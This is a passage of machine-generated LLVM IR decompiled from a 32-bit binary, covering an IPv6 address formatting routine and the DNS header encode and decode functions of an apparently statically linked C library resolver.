dec_label_pc_80574a3:                             ; preds = %dec_label_pc_805749e
  %v0_80574a3 = load i32, i32* @edi, align 4
  %v1_80574a3 = icmp eq i32 %v0_80574a3, 0
  %v1_80574a5 = icmp eq i1 %v1_80574a3, false
  br i1 %v1_80574a5, label %dec_label_pc_80574f2, label %dec_label_pc_80574a7

dec_label_pc_80574a7:                             ; preds = %dec_label_pc_80574a3
  %v0_80574a7 = load i32, i32* @ebp, align 4
  %v9_80574a7 = icmp eq i32 %v0_80574a7, 6
  br i1 %v9_80574a7, label %dec_label_pc_80574bb, label %dec_label_pc_80574ac

dec_label_pc_80574ac:                             ; preds = %dec_label_pc_80574a7
  %v9_80574ac = icmp eq i32 %v0_80574a7, 5
  %v1_80574af = icmp eq i1 %v9_80574ac, false
  br i1 %v1_80574af, label %dec_label_pc_80574f2, label %dec_label_pc_80574b1

dec_label_pc_80574b1:                             ; preds = %dec_label_pc_80574ac
  br i1 %v1_80574b9, label %dec_label_pc_80574f2, label %dec_label_pc_80574bb

dec_label_pc_80574bb:                             ; preds = %dec_label_pc_80574b1, %dec_label_pc_80574a7
  %v2_80574c1 = sub i32 %v1_805749d, %v2_8057471
  store i32 %v2_80574c1, i32* @esi, align 4
  %v2_80574cc = sub i32 46, %v2_80574c1
  store i32 %v2_80574cc, i32* @ecx, align 4
  %v1_80574ce = add i32 %arg2, 12
  store i32 %v1_80574ce, i32* @eax, align 4
  store i32 %v1_805749d, i32* @edx, align 4
  %v0_80574d3 = load i8*, i8** %stack_var_-124, align 4
  %v1_80574d3 = ptrtoint i8* %v0_80574d3 to i32
  %v3_80574d3 = ptrtoint i8* %stack_var_-120.164 to i32
  %v5_80574d3 = call i32 @inet_ntop4(i32 %v1_80574d3, i32 %v3_80574d3, i32 %stack_var_-116.163)
  store i32 %v5_80574d3, i32* %eax.global-to-local, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  %v1_80574da = icmp eq i32 %v5_80574d3, 0
  br i1 %v1_80574da, label %dec_label_pc_8057564, label %dec_label_pc_80574e2

dec_label_pc_80574e2:                             ; preds = %dec_label_pc_80574bb
  %v0_80574e5 = load i32, i32* @ebx, align 4
  %v5_80574e5 = inttoptr i32 %v0_80574e5 to i8*
  store i8* %v5_80574e5, i8** %stack_var_-124, align 4
  %v3_80574e6 = call i32 @strlen(i8* %v5_80574e5)
  store i32 %v3_80574e6, i32* %eax.global-to-local, align 4
  %v0_80574ee = load i32, i32* @ebx, align 4
  %v3_80574ee = add i32 %v0_80574ee, %v3_80574e6
  store i32 %v3_80574ee, i32* @ebx, align 4
  %v0_8057516.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_8057516

dec_label_pc_80574f2:                             ; preds = %dec_label_pc_805749e.thread, %dec_label_pc_80574b1, %dec_label_pc_80574ac, %dec_label_pc_80574a3, %dec_label_pc_805749e
  %v1_80574f355 = phi i32 [ 0, %dec_label_pc_805749e.thread ], [ %v0_805749e.pre, %dec_label_pc_80574b1 ], [ %v0_805749e.pre, %dec_label_pc_80574ac ], [ %v0_805749e.pre, %dec_label_pc_80574a3 ], [ %v0_805749e.pre, %dec_label_pc_805749e ]
  %v0_80574fc54 = phi i32 [ %v0_805749a65, %dec_label_pc_805749e.thread ], [ %v1_805749d, %dec_label_pc_80574b1 ], [ %v1_805749d, %dec_label_pc_80574ac ], [ %v1_805749d, %dec_label_pc_80574a3 ], [ %v1_805749d, %dec_label_pc_805749e ]
  %v0_80574f2 = load i32, i32* %eax.global-to-local, align 4
  store i32 %v0_80574f2, i32* %stack_var_-112, align 4
  %v2_80574f3 = mul i32 %v1_80574f355, 4
  %v4_80574f3 = add i32 %v3_80574f3, %v2_80574f3
  %v5_80574f3 = inttoptr i32 %v4_80574f3 to i32*
  %v6_80574f3 = load i32, i32* %v5_80574f3, align 4
  %v5_80574fc = inttoptr i32 %v0_80574fc54 to i8*
  store i8* %v5_80574fc, i8** %stack_var_-124, align 4
  %v4_80574fd = call i32 @sprintf(i32 %v0_80574fc54, i32 ptrtoint ([3 x i8]* @global_var_805c951.599 to i32))
  store i32 %v4_80574fd, i32* %eax.global-to-local, align 4
  %v0_8057505 = load i32, i32* @ebx, align 4
  %v2_8057505 = add i32 %v0_8057505, %v4_80574fd
  store i32 %v2_8057505, i32* @ebx, align 4
  br label %dec_label_pc_8057507

dec_label_pc_8057507:                             ; preds = %dec_label_pc_805748c, %dec_label_pc_8057490, %dec_label_pc_80574f2
  %stack_var_-116.0 = phi i32 [ %v6_80574f3, %dec_label_pc_80574f2 ], [ %stack_var_-116.163, %dec_label_pc_805748c ], [ %stack_var_-116.163, %dec_label_pc_8057490 ]
  %stack_var_-120.0 = phi i8* [ getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_805c951.599, i32 0, i32 0), %dec_label_pc_80574f2 ], [ %stack_var_-120.164, %dec_label_pc_805748c ], [ %stack_var_-120.164, %dec_label_pc_8057490 ]
  %v0_805749020 = phi i32 [ %v2_8057505, %dec_label_pc_80574f2 ], [ %v0_805749a65, %dec_label_pc_805748c ], [ %v1_8057493, %dec_label_pc_8057490 ]
  %v0_8057507 = load i32, i32* @esi, align 4
  %v1_8057507 = add i32 %v0_8057507, 1
  %v0_8057511.pre = load i32, i32* @edi, align 4
  store i32 %v1_8057507, i32* @esi, align 4
  %v7_805750b = icmp sgt i32 %v1_8057507, 7
  %v10_8057511 = icmp eq i32 %v0_8057511.pre, -1
  br i1 %v7_805750b, label %dec_label_pc_8057511, label %dec_label_pc_805747c

dec_label_pc_8057511:                             ; preds = %dec_label_pc_8057507
  br i1 %v10_8057511, label %dec_label_pc_8057522, label %dec_label_pc_8057516

dec_label_pc_8057516:                             ; preds = %dec_label_pc_8057511, %dec_label_pc_80574e2
  %v0_805751e = phi i32 [ %v0_805749020, %dec_label_pc_8057511 ], [ %v3_80574ee, %dec_label_pc_80574e2 ]
  %v0_8057516 = phi i32 [ %v0_8057511.pre, %dec_label_pc_8057511 ], [ %v0_8057516.pre, %dec_label_pc_80574e2 ]
  %v1_8057516 = load i32, i32* @ebp, align 4
  %v2_8057516 = add i32 %v1_8057516, %v0_8057516
  store i32 %v2_8057516, i32* %eax.global-to-local, align 4
  %v9_8057519 = icmp eq i32 %v2_8057516, 8
  %v1_805751c = icmp eq i1 %v9_8057519, false
  br i1 %v1_805751c, label %dec_label_pc_8057522, label %dec_label_pc_805751e

dec_label_pc_805751e:                             ; preds = %dec_label_pc_8057516
  %v1_805751e = inttoptr i32 %v0_805751e to i8*
  store i8 58, i8* %v1_805751e, align 1
  %v0_8057521 = load i32, i32* @ebx, align 4
  %v1_8057521 = add i32 %v0_8057521, 1
  store i32 %v1_8057521, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8057522

dec_label_pc_8057522:                             ; preds = %dec_label_pc_8057516, %dec_label_pc_8057511, %dec_label_pc_805751e
  %v0_8057526 = phi i32 [ %v0_805751e, %dec_label_pc_8057516 ], [ %v0_805749020, %dec_label_pc_8057511 ], [ %v1_8057521, %dec_label_pc_805751e ]
  store i32 %v2_8057471, i32* %edx.global-to-local, align 4
  %v1_8057526 = add i32 %v0_8057526, 1
  store i32 %v1_8057526, i32* %eax.global-to-local, align 4
  %v1_8057529 = inttoptr i32 %v0_8057526 to i8*
  store i8 0, i8* %v1_8057529, align 1
  %v0_805752c = load i32, i32* %eax.global-to-local, align 4
  %v1_805752c = load i32, i32* %edx.global-to-local, align 4
  %v2_805752c = sub i32 %v0_805752c, %v1_805752c
  store i32 %v2_805752c, i32* @eax, align 4
  %tmp79 = icmp ugt i32 %v2_805752c, %arg4
  br i1 %tmp79, label %dec_label_pc_8057534, label %dec_label_pc_8057541

dec_label_pc_8057534:                             ; preds = %dec_label_pc_8057522
  %v0_8057534 = load i8*, i8** %stack_var_-124, align 4
  %v1_8057534 = ptrtoint i8* %v0_8057534 to i32
  %v2_8057534 = call i32 @__errno_location(i32 %v1_8057534)
  store i32 %v2_8057534, i32* %eax.global-to-local, align 4
  %v1_8057539 = inttoptr i32 %v2_8057534 to i32*
  store i32 28, i32* %v1_8057539, align 4
  br label %dec_label_pc_8057562

dec_label_pc_8057541:                             ; preds = %dec_label_pc_8057522
  %v0_8057541 = load i32, i32* @edi, align 4
  store i32 %v0_8057541, i32* %stack_var_-112, align 4
  %tmp46 = bitcast i8** %stack_var_12 to i32*
  %v3_80575443 = load i32, i32* %tmp46, align 4
  %tmp47 = bitcast i8** %stack_var_-124 to i32*
  store i32 %v3_80575443, i32* %tmp47, align 4
  %v0_805754b.cast = inttoptr i32 %v3_80575443 to i8*
  %v5_805754b = call i32 @strcpy(i8* %v0_805754b.cast, i32 %v2_8057471)
  store i32 %v5_805754b, i32* %eax.global-to-local, align 4
  store i32 %v5_805754b, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8057564

dec_label_pc_8057557:                             ; preds = %dec_label_pc_80573b0
  %v1_8057557 = call i32 @__errno_location(i32 %v0_80573a3)
  store i32 %v1_8057557, i32* %eax.global-to-local, align 4
  %v1_805755c = inttoptr i32 %v1_8057557 to i32*
  store i32 97, i32* %v1_805755c, align 4
  br label %dec_label_pc_8057562

dec_label_pc_8057562:                             ; preds = %dec_label_pc_8057534, %dec_label_pc_8057557
  store i32 0, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8057564

dec_label_pc_8057564:                             ; preds = %dec_label_pc_80574bb, %dec_label_pc_8057541, %dec_label_pc_80573bb, %dec_label_pc_8057562
  %v0_8057567 = phi i32 [ 0, %dec_label_pc_80574bb ], [ %v5_805754b, %dec_label_pc_8057541 ], [ %v3_80573c7, %dec_label_pc_80573bb ], [ 0, %dec_label_pc_8057562 ]
  store i32 %v0_8057567, i32* %eax.global-to-local, align 4
  store i32 %v0_80573a3, i32* %ebx.global-to-local, align 4
  ret i32 %v0_8057567

; uselistorder directives
  uselistorder i32 %v0_8057567, { 1, 0 }
  uselistorder i32 %v0_8057526, { 1, 0 }
  uselistorder i32 %v1_8057507, { 1, 0, 2 }
  uselistorder i32 %v0_80574fc54, { 1, 0 }
  uselistorder i32 %v0_805749e.pre, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_805749d, { 5, 4, 3, 2, 1, 0, 6 }
  uselistorder i32 %stack_var_-116.163, { 2, 1, 0 }
  uselistorder i8* %stack_var_-120.164, { 2, 1, 0 }
  uselistorder i32 %v0_805749a65, { 2, 3, 1, 0 }
  uselistorder i32 %v1_805748c66, { 2, 0, 1 }
  uselistorder i32 %v0_805749667, { 2, 1, 0, 3 }
  uselistorder i32 %v2_8057471, { 1, 3, 2, 0, 4 }
  uselistorder i32 %v1_8057469, { 1, 0 }
  uselistorder i32 %v0_8057469, { 1, 2, 0 }
  uselistorder i32 %v1_805744c, { 0, 2, 1 }
  uselistorder i32 %v0_805743c10, { 1, 0, 2, 3 }
  uselistorder i32 %v0_805744714, { 0, 2, 1, 3 }
  uselistorder i1 %v10_8057437, { 1, 0 }
  uselistorder i32 %v0_805746269, { 1, 0, 3, 2 }
  uselistorder i32 %v0_805745770, { 2, 1, 0, 4, 3 }
  uselistorder i32 %v0_805744c72, { 4, 1, 3, 2, 0 }
  uselistorder i32 %v0_805740773, { 3, 2, 4, 0, 1 }
  uselistorder i32 %v0_80573a3, { 0, 2, 1 }
  uselistorder i32* %stack_var_-112, { 0, 1, 3, 2 }
  uselistorder i8** %stack_var_-124, { 0, 5, 3, 2, 4, 1 }
  uselistorder i32* %ebx.global-to-local, { 0, 1, 6, 5, 2, 4, 3, 7 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 5, 3, 4, 6, 7, 13, 8, 9, 10, 11, 12, 14, 15, 16, 17, 18, 19, 20, 21 }
  uselistorder i32 97, { 2, 3, 1, 0, 4, 5, 6 }
  uselistorder i32 (i32, i32)* @sprintf, { 4, 3, 2, 1, 0 }
  uselistorder [3 x i8]* @global_var_805c951.599, { 1, 0 }
  uselistorder i8 58, { 4, 5, 6, 0, 1, 2, 3 }
  uselistorder i32 64, { 7, 3, 0, 6, 8, 5, 2, 4, 1 }
  uselistorder i32* @esp, { 0, 1, 63, 64, 65, 66, 67, 68, 234, 235, 236, 237, 238, 239, 240, 241, 242, 243, 244, 16, 245, 246, 247, 248, 249, 250, 251, 252, 253, 254, 12, 255, 256, 257, 13, 258, 10, 259, 260, 261, 262, 263, 264, 14, 265, 266, 267, 268, 269, 270, 271, 272, 273, 274, 275, 276, 277, 11, 278, 279, 280, 281, 282, 283, 15, 284, 285, 286, 287, 288, 289, 290, 291, 292, 293, 294, 295, 296, 297, 298, 299, 300, 301, 302, 303, 304, 305, 2, 3, 351, 4, 5, 6, 17, 306, 307, 308, 309, 18, 310, 311, 312, 313, 314, 20, 315, 316, 317, 22, 318, 23, 319, 320, 321, 322, 323, 324, 325, 326, 327, 328, 329, 330, 21, 331, 24, 332, 333, 334, 25, 335, 336, 337, 338, 339, 340, 341, 342, 19, 343, 97, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 81, 9, 79, 80, 82, 83, 84, 85, 86, 26, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 175, 7, 165, 166, 167, 168, 169, 27, 170, 171, 172, 173, 174, 176, 177, 178, 179, 191, 8, 180, 181, 182, 183, 184, 185, 28, 186, 187, 188, 189, 190, 192, 193, 194, 195, 29, 196, 197, 198, 199, 200, 201, 202, 203, 204, 205, 206, 207, 208, 209, 210, 211, 212, 213, 214, 215, 216, 217, 218, 30, 219, 220, 221, 222, 223, 224, 225, 226, 227, 228, 229, 230, 231, 232, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 233, 344, 345, 346, 347, 348, 349, 350 }
  uselistorder i32 15, { 1, 5, 12, 11, 2, 10, 3, 4, 6, 7, 8, 9, 0 }
  uselistorder i32 60, { 6, 7, 3, 8, 9, 4, 1, 2, 5, 0 }
  uselistorder i64 4294967296, { 0, 1, 2, 3, 4, 5, 6, 7, 9, 8, 10, 11, 12, 13, 14, 15, 16, 17, 18 }
  uselistorder i32 (i8*, i32, i32)* @__GI_memset, { 1, 10, 11, 12, 16, 21, 19, 18, 20, 13, 2, 3, 4, 5, 6, 7, 8, 0, 9, 14, 15, 17 }
  uselistorder i32 (i32, i32, i32)* @inet_ntop4, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0, 4, 2, 3 }
  uselistorder i32 %arg1, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_8057564, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_8057562, { 1, 0 }
  uselistorder label %dec_label_pc_8057522, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8057507, { 2, 1, 0 }
  uselistorder label %dec_label_pc_80574f2, { 1, 2, 3, 4, 0 }
  uselistorder label %dec_label_pc_805747c, { 1, 0 }
  uselistorder label %dec_label_pc_8057471, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8057464, { 1, 0 }
  uselistorder label %dec_label_pc_8057460, { 1, 0 }
  uselistorder label %dec_label_pc_805744c, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_8057449, { 1, 0 }
  uselistorder label %dec_label_pc_805741f, { 1, 0 }
}

define i32 @__encode_header() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp8 = call i8* @__decompiler_undefined_function_2()
  %tmp9 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-8 = alloca i32, align 4
  %v0_8057571 = load i32, i32* @ebx, align 4
  store i32 %v0_8057571, i32* %stack_var_-8, align 4
  store i32 %tmp9, i32* %ebx.global-to-local, align 4
  %v4_8057579 = ptrtoint i8* %tmp8 to i32
  store i32 %v4_8057579, i32* %esi.global-to-local, align 4
  %v7_8057582 = icmp sgt i32 %tmp, 11
  br i1 %v7_8057582, label %dec_label_pc_8057588, label %dec_label_pc_805761e

dec_label_pc_8057588:                             ; preds = %entry
  %v1_8057588 = add i32 %tmp9, 1
  %v2_8057588 = inttoptr i32 %v1_8057588 to i8*
  %v3_8057588 = load i8, i8* %v2_8057588, align 1
  store i8 %v3_8057588, i8* %tmp8, align 1
  %v0_805758e = load i32, i32* %ebx.global-to-local, align 4
  %v1_805758e = inttoptr i32 %v0_805758e to i32*
  %v2_805758e = load i32, i32* %v1_805758e, align 4
  %v1_8057590 = trunc i32 %v2_805758e to i8
  %v2_8057590 = load i32, i32* %esi.global-to-local, align 4
  %v3_8057590 = add i32 %v2_8057590, 1
  %v4_8057590 = inttoptr i32 %v3_8057590 to i8*
  store i8 %v1_8057590, i8* %v4_8057590, align 1
  %v0_80575b6 = load i32, i32* %ebx.global-to-local, align 4
  %v1_80575b6 = add i32 %v0_80575b6, 8
  %v2_80575b6 = inttoptr i32 %v1_80575b6 to i32*
  %v3_80575b6 = load i32, i32* %v2_80575b6, align 4
  %v1_80575b9 = mul i32 %v3_80575b6, 8
  %v2_80575bf = or i32 %v1_80575b9, 4
  %v1_80575c1 = add i32 %v0_80575b6, 20
  %v2_80575c1 = inttoptr i32 %v1_80575c1 to i32*
  %v3_80575c1 = load i32, i32* %v2_80575c1, align 4
  %v4_80575c1 = icmp eq i32 %v3_80575c1, 0
  %v1_80575c5 = icmp eq i1 %v4_80575c1, false
  %v2_80575c5 = zext i1 %v1_80575c5 to i32
  %v2_80575c8 = or i32 %v2_80575c5, %v2_80575bf
  %v2_80575ca = or i32 %v2_80575c8, -126
  %v5_80575ca = trunc i32 %v2_80575ca to i8
  store i32 %v2_80575ca, i32* @ecx, align 4
  %v2_80575cc = load i32, i32* %esi.global-to-local, align 4
  %v3_80575cc = add i32 %v2_80575cc, 2
  %v4_80575cc = inttoptr i32 %v3_80575cc to i8*
  store i8 %v5_80575ca, i8* %v4_80575cc, align 1
  %v0_80575cf = load i32, i32* %ebx.global-to-local, align 4
  %v1_80575d5 = add i32 %v0_80575cf, 28
  %v2_80575d5 = inttoptr i32 %v1_80575d5 to i8*
  %v3_80575d5 = load i8, i8* %v2_80575d5, align 1
  %tmp13 = urem i8 %v3_80575d5, 16
  %v2_80575e0 = or i8 %tmp13, -128
  %v2_80575e2 = load i32, i32* %esi.global-to-local, align 4
  %v3_80575e2 = add i32 %v2_80575e2, 3
  %v4_80575e2 = inttoptr i32 %v3_80575e2 to i8*
  store i8 %v2_80575e0, i8* %v4_80575e2, align 1
  %v0_80575e5 = load i32, i32* %ebx.global-to-local, align 4
  %v1_80575e5 = add i32 %v0_80575e5, 33
  %v2_80575e5 = inttoptr i32 %v1_80575e5 to i8*
  %v3_80575e5 = load i8, i8* %v2_80575e5, align 1
  %v2_80575e9 = load i32, i32* %esi.global-to-local, align 4
  %v3_80575e9 = add i32 %v2_80575e9, 4
  %v4_80575e9 = inttoptr i32 %v3_80575e9 to i8*
  store i8 %v3_80575e5, i8* %v4_80575e9, align 1
  %v0_80575ec = load i32, i32* %ebx.global-to-local, align 4
  %v1_80575ec = add i32 %v0_80575ec, 32
  %v2_80575ec = inttoptr i32 %v1_80575ec to i32*
  %v3_80575ec = load i32, i32* %v2_80575ec, align 4
  %v1_80575ef = trunc i32 %v3_80575ec to i8
  %v2_80575ef = load i32, i32* %esi.global-to-local, align 4
  %v3_80575ef = add i32 %v2_80575ef, 5
  %v4_80575ef = inttoptr i32 %v3_80575ef to i8*
  store i8 %v1_80575ef, i8* %v4_80575ef, align 1
  %v0_80575f2 = load i32, i32* %ebx.global-to-local, align 4
  %v1_80575f2 = add i32 %v0_80575f2, 37
  %v2_80575f2 = inttoptr i32 %v1_80575f2 to i8*
  %v3_80575f2 = load i8, i8* %v2_80575f2, align 1
  %v2_80575f6 = load i32, i32* %esi.global-to-local, align 4
  %v3_80575f6 = add i32 %v2_80575f6, 6
  %v4_80575f6 = inttoptr i32 %v3_80575f6 to i8*
  store i8 %v3_80575f2, i8* %v4_80575f6, align 1
  %v0_80575f9 = load i32, i32* %ebx.global-to-local, align 4
  %v1_80575f9 = add i32 %v0_80575f9, 36
  %v2_80575f9 = inttoptr i32 %v1_80575f9 to i32*
  %v3_80575f9 = load i32, i32* %v2_80575f9, align 4
  %v1_80575fc = trunc i32 %v3_80575f9 to i8
  %v2_80575fc = load i32, i32* %esi.global-to-local, align 4
  %v3_80575fc = add i32 %v2_80575fc, 7
  %v4_80575fc = inttoptr i32 %v3_80575fc to i8*
  store i8 %v1_80575fc, i8* %v4_80575fc, align 1
  %v0_80575ff = load i32, i32* %ebx.global-to-local, align 4
  %v1_80575ff = add i32 %v0_80575ff, 41
  %v2_80575ff = inttoptr i32 %v1_80575ff to i8*
  %v3_80575ff = load i8, i8* %v2_80575ff, align 1
  %v2_8057603 = load i32, i32* %esi.global-to-local, align 4
  %v3_8057603 = add i32 %v2_8057603, 8
  %v4_8057603 = inttoptr i32 %v3_8057603 to i8*
  store i8 %v3_80575ff, i8* %v4_8057603, align 1
  %v0_8057606 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8057606 = add i32 %v0_8057606, 40
  %v2_8057606 = inttoptr i32 %v1_8057606 to i32*
  %v3_8057606 = load i32, i32* %v2_8057606, align 4
  %v1_8057609 = trunc i32 %v3_8057606 to i8
  %v2_8057609 = load i32, i32* %esi.global-to-local, align 4
  %v3_8057609 = add i32 %v2_8057609, 9
  %v4_8057609 = inttoptr i32 %v3_8057609 to i8*
  store i8 %v1_8057609, i8* %v4_8057609, align 1
  %v0_805760c = load i32, i32* %ebx.global-to-local, align 4
  %v1_805760c = add i32 %v0_805760c, 45
  %v2_805760c = inttoptr i32 %v1_805760c to i8*
  %v3_805760c = load i8, i8* %v2_805760c, align 1
  %v2_8057610 = load i32, i32* %esi.global-to-local, align 4
  %v3_8057610 = add i32 %v2_8057610, 10
  %v4_8057610 = inttoptr i32 %v3_8057610 to i8*
  store i8 %v3_805760c, i8* %v4_8057610, align 1
  %v0_8057613 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8057613 = add i32 %v0_8057613, 44
  %v2_8057613 = inttoptr i32 %v1_8057613 to i32*
  %v3_8057613 = load i32, i32* %v2_8057613, align 4
  %v1_8057616 = trunc i32 %v3_8057613 to i8
  %v2_8057616 = load i32, i32* %esi.global-to-local, align 4
  %v3_8057616 = add i32 %v2_8057616, 11
  %v4_8057616 = inttoptr i32 %v3_8057616 to i8*
  store i8 %v1_8057616, i8* %v4_8057616, align 1
  %v2_805761e.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_805761e

dec_label_pc_805761e:                             ; preds = %entry, %dec_label_pc_8057588
  %v2_805761e = phi i32 [ %v0_8057571, %entry ], [ %v2_805761e.pre, %dec_label_pc_8057588 ]
  %v0_8057620 = phi i32 [ -1, %entry ], [ 12, %dec_label_pc_8057588 ]
  store i32 %v2_805761e, i32* %ebx.global-to-local, align 4
  ret i32 %v0_8057620

; uselistorder directives
  uselistorder i32 45, { 5, 2, 6, 4, 1, 0, 3 }
  uselistorder i32 41, { 2, 1, 0 }
  uselistorder i32 37, { 2, 1, 3, 0 }
  uselistorder i32 33, { 4, 3, 5, 1, 2, 0 }
  uselistorder label %dec_label_pc_805761e, { 1, 0 }
}

define i32 @__decode_header() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp2 = call i8* @__decompiler_undefined_function_2()
  %stack_var_-4 = alloca i32, align 4
  %v0_8057624 = load i32, i32* @ebx, align 4
  store i32 %v0_8057624, i32* %stack_var_-4, align 4
  %v4_8057625 = ptrtoint i8* %tmp2 to i32
  store i32 %v4_8057625, i32* @ecx, align 4
  store i32 %tmp, i32* %ebx.global-to-local, align 4
  %v2_805762d = load i8, i8* %tmp2, align 1
  %v3_805762d = zext i8 %v2_805762d to i32
  %v1_8057630 = add i32 %v4_8057625, 1
  %v2_8057630 = inttoptr i32 %v1_8057630 to i8*
  %v3_8057630 = load i8, i8* %v2_8057630, align 1
  %v4_8057630 = zext i8 %v3_8057630 to i32
  %v2_8057634 = mul nuw nsw i32 %v3_805762d, 256
  %v2_8057637 = or i32 %v4_8057630, %v2_8057634
  %v2_8057639 = inttoptr i32 %tmp to i32*
  store i32 %v2_8057637, i32* %v2_8057639, align 4
  %v0_805763b = load i32, i32* @ecx, align 4
  %v1_805763b = add i32 %v0_805763b, 2
  %v2_805763b = inttoptr i32 %v1_805763b to i8*
  %v3_805763b = load i8, i8* %v2_805763b, align 1
  %tmp6 = icmp slt i8 %v3_805763b, 0
  %v2_805763f = zext i1 %tmp6 to i32
  %v1_8057642 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8057642 = add i32 %v1_8057642, 4
  %v3_8057642 = inttoptr i32 %v2_8057642 to i32*
  store i32 %v2_805763f, i32* %v3_8057642, align 4
  %v0_8057645 = load i32, i32* @ecx, align 4
  %v1_8057645 = add i32 %v0_8057645, 2
  %v2_8057645 = inttoptr i32 %v1_8057645 to i8*
  %v3_8057645 = load i8, i8* %v2_8057645, align 1
  %v3_8057648 = udiv i8 %v3_8057645, 8
  %tmp7 = urem i8 %v3_8057648, 16
  %v1_805764b = zext i8 %tmp7 to i32
  %v1_805764e = load i32, i32* %ebx.global-to-local, align 4
  %v2_805764e = add i32 %v1_805764e, 8
  %v3_805764e = inttoptr i32 %v2_805764e to i32*
  store i32 %v1_805764b, i32* %v3_805764e, align 4
  %v0_8057651 = load i32, i32* @ecx, align 4
  %v1_8057651 = add i32 %v0_8057651, 2
  %v2_8057651 = inttoptr i32 %v1_8057651 to i8*
  %v3_8057651 = load i8, i8* %v2_8057651, align 1
  %div = udiv i8 %v3_8057651, 4
  %tmp8 = urem i8 %div, 2
  %v1_8057658 = zext i8 %tmp8 to i32
  %v1_805765b = load i32, i32* %ebx.global-to-local, align 4
  %v2_805765b = add i32 %v1_805765b, 12
  %v3_805765b = inttoptr i32 %v2_805765b to i32*
  store i32 %v1_8057658, i32* %v3_805765b, align 4
  %v0_805765e = load i32, i32* @ecx, align 4
  %v1_805765e = add i32 %v0_805765e, 2
  %v2_805765e = inttoptr i32 %v1_805765e to i8*
  %v3_805765e = load i8, i8* %v2_805765e, align 1
  %div5 = udiv i8 %v3_805765e, 2
  %tmp9 = urem i8 %div5, 2
  %v1_8057664 = zext i8 %tmp9 to i32
  %v1_8057667 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8057667 = add i32 %v1_8057667, 16
  %v3_8057667 = inttoptr i32 %v2_8057667 to i32*
  store i32 %v1_8057664, i32* %v3_8057667, align 4
  %v0_805766a = load i32, i32* @ecx, align 4
  %v1_805766a = add i32 %v0_805766a, 2
  %v2_805766a = inttoptr i32 %v1_805766a to i8*
  %v3_805766a = load i8, i8* %v2_805766a, align 1
  %tmp10 = urem i8 %v3_805766a, 2
  %v1_805766e = zext i8 %tmp10 to i32
  %v1_8057671 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8057671 = add i32 %v1_8057671, 20
  %v3_8057671 = inttoptr i32 %v2_8057671 to i32*
  store i32 %v1_805766e, i32* %v3_8057671, align 4
  %v0_8057674 = load i32, i32* @ecx, align 4
  %v1_8057674 = add i32 %v0_8057674, 3
  %v2_8057674 = inttoptr i32 %v1_8057674 to i8*
  %v3_8057674 = load i8, i8* %v2_8057674, align 1
  %tmp11 = icmp slt i8 %v3_8057674, 0
  %v2_8057678 = zext i1 %tmp11 to i32
  %v1_805767b = load i32, i32* %ebx.global-to-local, align 4
  %v2_805767b = add i32 %v1_805767b, 24
  %v3_805767b = inttoptr i32 %v2_805767b to i32*
  store i32 %v2_8057678, i32* %v3_805767b, align 4
  %v0_805767e = load i32, i32* @ecx, align 4
  %v1_805767e = add i32 %v0_805767e, 3
  %v2_805767e = inttoptr i32 %v1_805767e to i8*
  %v3_805767e = load i8, i8* %v2_805767e, align 1
  %tmp12 = urem i8 %v3_805767e, 16
  %v1_8057682 = zext i8 %tmp12 to i32
  %v1_8057685 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8057685 = add i32 %v1_8057685, 28
  %v3_8057685 = inttoptr i32 %v2_8057685 to i32*
  store i32 %v1_8057682, i32* %v3_8057685, align 4
  %v0_8057688 = load i32, i32* @ecx, align 4
  %v1_8057688 = add i32 %v0_8057688, 4
  %v2_8057688 = inttoptr i32 %v1_8057688 to i8*
  %v3_8057688 = load i8, i8* %v2_8057688, align 1
  %v4_8057688 = zext i8 %v3_8057688 to i32
  %v1_805768c = add i32 %v0_8057688, 5
  %v2_805768c = inttoptr i32 %v1_805768c to i8*
  %v3_805768c = load i8, i8* %v2_805768c, align 1
  %v4_805768c = zext i8 %v3_805768c to i32
  %v2_8057690 = mul nuw nsw i32 %v4_8057688, 256
  %v2_8057693 = or i32 %v4_805768c, %v2_8057690
  %v1_8057695 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8057695 = add i32 %v1_8057695, 32
  %v3_8057695 = inttoptr i32 %v2_8057695 to i32*
  store i32 %v2_8057693, i32* %v3_8057695, align 4
  %v0_8057698 = load i32, i32* @ecx, align 4
  %v1_8057698 = add i32 %v0_8057698, 6
  %v2_8057698 = inttoptr i32 %v1_8057698 to i8*
  %v3_8057698 = load i8, i8* %v2_8057698, align 1
  %v4_8057698 = zext i8 %v3_8057698 to i32
